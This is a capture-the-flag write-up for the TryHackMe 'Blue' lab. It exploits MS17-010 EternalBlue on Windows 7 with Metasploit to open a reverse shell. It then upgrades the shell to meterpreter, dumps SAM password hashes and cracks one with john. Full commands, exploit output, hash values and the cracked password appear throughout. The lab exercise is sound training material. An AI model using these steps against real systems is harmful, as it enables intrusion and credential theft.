<p align="center">
  THM : Blue<br>
  Difficulty : Easy<br>
  <img src="https://i.imgur.com/ga1vRZp.png">
</p>


## Summary
- [NMAP Scan](#nmap-scan)
- [Gain access](#gain-access)
- [Privilege Escalation](#privilege-escalation)
- [Password crack](#password-crack)
- [Find flags](#find-flags)
- [Conclusion](#conclusion)

## NMAP Scan
First, I scan the machine using```nmap -A -Pn -oN nmapResults 10.10.95.229```  
```
# Nmap 7.92 scan initiated Wed Jul  6 13:06:01 2022 as: nmap -A -Pn -oN nmapResults 10.10.95.229
Nmap scan report for 10.10.95.229
Host is up (0.092s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2022-07-06T11:07:33+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2022-07-05T11:02:14
|_Not valid after:  2023-01-04T11:02:14
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2022-07-06T11:07:27+00:00
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: -1s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:f9:fa:a6:df:b5 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-07-06T11:07:27
|_  start_date: 2022-07-06T11:02:13
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-07-06T06:07:27-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul  6 13:07:33 2022 -- 1 IP address (1 host up) scanned in 91.78 seconds
```  
**How many ports are open with a port number under 1000 ?**  
Answer : 3

**What is this machine vulnerable to ? (Answer in the form of: ms??-???, ex: ms08-067)**  
We see that port 139 and 445 are open, it means that we can communicate with the SMB protocol to the machine. You can see [here](https://fr.wikipedia.org/wiki/Server_Message_Block) what is this protocol and its purpose.
If we search for "Windows 7 SMB vulnerability", we find a vulnerability named [EternalBlue](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/).
We can now answer this question : ms17-010

## Gain access
For this task, we are going to use metasploit (like asked by the author of this room).
To start [Metasploit](https://www.metasploit.com/), we have to use ```msfconsole``` in a terminal.  
```
attacker@AttackBox:~$ msfconsole
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v6.2.32-dev-                         ]
+ -- --=[ 2274 exploits - 1192 auxiliary - 406 post       ]
+ -- --=[ 948 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: When in a module, use back to go 
back to the top level prompt
Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```

**Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)**  
To find an exploit on msfconsole, we use ```search```, so here, we use ```search EternalBlue```. It gives us a list of exploits, we will use the first one of the list.   
```
msf6 > search EternalBlue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 >
```

We can now answer the question : exploit/windows/smb/ms17_010_eternalblue  
To use this exploit, we just need to type ```use 0```, to use the exploit shown at index 0 on the list. When we select an exploit that needs a payload, msfconsole will automatically select a default payload.  

**Show options and set the one required value. What is the name of this value ? (All caps for submission)**  
To show options of the current exploit, we just need to type ```show options```, it's easy to use right ?
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/w
                                             iki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Wi
                                             ndows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
                                             ines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Window
                                             s Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines
                                             .
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2
                                             008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

The answer is : RHOSTS (But we also have to change the LHOST option to use tun0 interface instead of eth0 interface).
So we use ```set RHOSTS 10.10.95.229``` to specify the target, and ```set LHOST 10.X.X.X``` with our own address on tun0 interface to get the reverse shell.

It is asked to use a specific payload with ```set payload windows/x64/shell/reverse_tcp```.  
Now we can run the exploit by using ```run```.
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.14.32.60:4444 
[*] 10.10.100.165:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.100.165:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.100.165:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.100.165:445 - The target is vulnerable.
[*] 10.10.100.165:445 - Connecting to target for exploitation.
[+] 10.10.100.165:445 - Connection established for exploitation.
[+] 10.10.100.165:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.100.165:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.100.165:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.100.165:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.100.165:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.100.165:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.100.165:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.100.165:445 - Sending all but last fragment of exploit packet
[*] 10.10.100.165:445 - Starting non-paged pool grooming
[+] 10.10.100.165:445 - Sending SMBv2 buffers
[+] 10.10.100.165:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.100.165:445 - Sending final SMBv2 buffers.
[*] 10.10.100.165:445 - Sending last fragment of exploit packet!
[*] 10.10.100.165:445 - Receiving response from exploit packet
[+] 10.10.100.165:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.100.165:445 - Sending egg to corrupted connection.
[*] 10.10.100.165:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.100.165
[*] Command shell session 1 opened (10.14.32.60:4444 -> 10.10.100.165:49171) at 2023-01-13 23:43:16 +0100
[+] 10.10.100.165:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.100.165:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.100.165:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>
```

Now we have a reverse shell ! It is asked to background the shell using CTRL+Z.

## Privilege Escalation

**If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use ? (Exact path, similar to the exploit we previously selected)**  
I found [this web page](https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646) that explain how to convert our shell to a meterpreter, we will use the post module  
```post/multi/manage/shell_to_meterpreter```.  
So the answer is : post/multi/manage/shell_to_meterpreter  
Let's type ```use post/multi/manage/shell_to_meterpreter```.  


**Select this (use MODULE_PATH). Show options, what option are we required to change ?**  
Now we can see the options of the module by typing ```show options``` again.  
```
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto
                                        detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.
```

The answer is : SESSION  

To know what sessions are running, we use ```sessions -l```.  
```
msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type               Information                                         Connection
  --  ----  ----               -----------                                         ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601]  10.14.32.60:4444 -> 10.10.100.165:49171 (10.10.100.165)
```

After that, we just have to use ```set SESSION 1```, where 1 is the ID of the running session.  
Now, we can run the post module to convert our shell to a meterpreter with ```run```.  

If we list sessions again, we see that we have 1 more session.  
```
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                         Connection
  --  ----  ----                     -----------                                         ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601]  10.14.32.60:4444 -> 10.10.100.165:49171 (10.10.100.165)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                        10.14.32.60:4433 -> 10.10.100.165:49189 (10.10.100.165)
```

Now we just have to select the meterpreter session by using ```sessions 2```.
We can type ```help``` to have a list of commands available with the meterpreter.
```
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcat          Read the contents of a local file to the screen
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idletime       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch the remote user desktop in real time
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes

meterpreter > 
```
It is possible to verify that we have escalated to SYSTEM user by using ```getsystem```.  
```
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter >
```

Like said in the room's question : "Just because we are system doesn't mean our process is". So we need to migrate to a process that is running as SYSTEM.
First, let's check the process list with ```ps```.  
```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 352   2096  mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 444   704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 556   548   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 604   548   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 616   596   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 656   596   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 704   604   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 712   604   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 720   604   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 772   704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 828   704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 896   704   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 944   704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1012  656   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1076  704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1172  704   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1268  704   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1304  704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1400  704   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssme-agent.exe
 1476  704   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1604  704   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1940  704   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1956  704   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 2032  1832  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 2096  704   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
 2104  828   WmiPrvSE.exe
 2412  704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2460  704   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2576  704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2612  704   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2772  704   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 2812  556   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2972  556   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2984  1268  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
```

We just have to use a process running as SYSTEM, so for exemple, let's take process 1268 (spoolsv.exe).  
So let's type ```migrate 1268```.  
```
meterpreter > migrate 1268
[*] Migrating from 2032 to 1268...
[*] Migration completed successfully.
meterpreter >
```

## Password crack
**Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user ?**  
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter >
```

So we use ```hashdump``` to dump user's password hashes of the machine.
Answer : Jon  

Let's copy the password hash of user Jon and crack it. 
First, we need to know what hash type is it. I use this [Hash Identifier](https://hashes.com/en/tools/hash_identifier).  
In this case, the hash identifier found the corresponding password to the given hash.  If it doesn't find it, we can try using [john](https://www.openwall.com/john/doc/).
Let's write the hash into a file with ```echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > hash.txt```.  
Now we can try to crack the password hash using the rockyou.txt well known wordlist. We know that the hash type is NTLM.
Lets type `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT`.
```
attacker@AttackBox:~$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 SSE4.1 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
alqfna22         (?)     
1g 0:00:00:00 DONE (2023-01-13 23:59) 1.136g/s 11591Kp/s 11591Kc/s 11591KC/s alqueva1968..alpus
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed.
```

And we successfuly cracked the hash !  

**Question : Copy this password hash to a file and research how to crack it. What is the cracked password ?**  
**Answer : alqfna22**  

## Find flags
Now let's find the flags !
**Flag1 ? This flag can be found at the system root.**  
By default, the system's root on windows is located in C: , so let's move to this directory and list the files.  
```
meterpreter > ls
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-13 04:13:36 +0100  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 07:08:56 +0200  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-14 05:20:08 +0200  PerfLogs
040555/r-xr-xr-x  4096   dir   2019-03-17 23:22:01 +0100  Program Files
040555/r-xr-xr-x  4096   dir   2019-03-17 23:28:38 +0100  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2019-03-17 23:35:57 +0100  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-13 04:13:22 +0100  Recovery
040777/rwxrwxrwx  4096   dir   2022-07-06 13:38:44 +0200  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-13 04:13:28 +0100  Users
040777/rwxrwxrwx  16384  dir   2019-03-17 23:36:30 +0100  Windows
100666/rw-rw-rw-  24     fil   2019-03-17 20:27:21 +0100  flag1.txt
000000/---------  0      fif   1970-01-01 01:00:00 +0100  hiberfil.sys
000000/---------  0      fif   1970-01-01 01:00:00 +0100  pagefile.sys
```
And there is the flag ! Just use `cat flag1.txt`.

**Question : Flag1 ? This flag can be found at the system root.**  
**Answer : flag{*HIDDEN*}**  

**Question : Flag 2 ? This flag can be found at the location where passwords are stored within Windows.**  
I looked where the passwords are stored and I found the answer [here](https://superuser.com/questions/367579/where-are-windows-7-passwords-stored).  
So let's move to ```C:/windows/system32/config``` and then list the files.  
```
meterpreter > ls
Listing: C:\windows\system32\config
===================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  28672     fil   2018-12-13 00:00:40 +0100  BCD-Template
100666/rw-rw-rw-  25600     fil   2018-12-13 00:00:40 +0100  BCD-Template.LOG
100666/rw-rw-rw-  18087936  fil   2022-07-06 13:13:55 +0200  COMPONENTS
100666/rw-rw-rw-  1024      fil   2011-04-12 10:32:10 +0200  COMPONENTS.LOG
...
...
...
100666/rw-rw-rw-  524288    fil   2019-03-17 23:21:22 +0100  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 23:21:22 +0100  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  4096      dir   2018-12-13 00:03:05 +0100  TxR
100666/rw-rw-rw-  34        fil   2019-03-17 20:32:48 +0100  flag2.txt
040777/rwxrwxrwx  4096      dir   2010-11-21 03:41:37 +0100  systemprofile
```

There is the flag 2 ! Again, just use cat to read the flag2.txt file.  
**Answer : flag{*HIDDEN*}**  


**Question : Flag3 ? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.**  
The first place I looked was C:/Users/Jon/Desktop/ but there is no flag here. So I looked in C:/Users/Jon/Documents and there is the flag !
Just use cat to read the flag3.txt file.  
**Answer : flag{*HIDDEN*}**  

## Conclusion
This room was made to introduce us to pentesting on a windows machine. For me, the port scanning and the exploit research part is similar as on linux machine. 
But the privilege escalation part is very different. It's the first time I do pentest on a windows machine. Thanks for reading my write up ! 
